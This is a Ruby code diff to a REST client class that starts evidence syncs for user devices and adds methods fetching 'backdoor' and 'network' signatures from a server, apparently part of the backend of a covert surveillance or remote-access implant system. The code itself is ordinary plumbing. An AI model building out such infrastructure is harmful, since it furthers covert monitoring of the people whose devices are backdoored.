@@ -104,15 +104,16 @@ class DB_rest
 
   def sync_start(session, version, user, device, source, time)
     begin
-      content = {:bid => session['bid'],
-                 :build => session['build'],
-                 :instance => session['instance'],
-                 :subtype => session['subtype'],
+      content = {:bid => session[:bid],
+                 :build => session[:build],
+                 :instance => session[:instance],
+                 :subtype => session[:subtype],
                  :version => version,
                  :user => user,
                  :device => device,
                  :source => source,
                  :sync_time => time}
+      
       rest_call('POST', '/evidence/start', content.to_json)
     rescue
     end
@@ -159,6 +160,28 @@ class DB_rest
       return rest_call('POST', '/status', content.to_json)
     rescue Exception => e
       trace :error, "Error calling status_update: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def backdoor_signature
+    begin
+      ret = rest_call('GET', '/signature/backdoor')
+      sign = JSON.parse(ret.body)['sign']
+      return sign
+    rescue Exception => e
+      trace :error, "Error calling backdoor_signature: #{e.class} #{e.message}"
+      propagate_error e
+    end
+  end
+
+  def network_signature
+    begin
+      ret = rest_call('GET', '/signature/network')
+      sign = JSON.parse(ret.body)['sign']
+      return sign
+    rescue Exception => e
+      trace :error, "Error calling network_signature: #{e.class} #{e.message}"
       propagate_error e
     end
   end
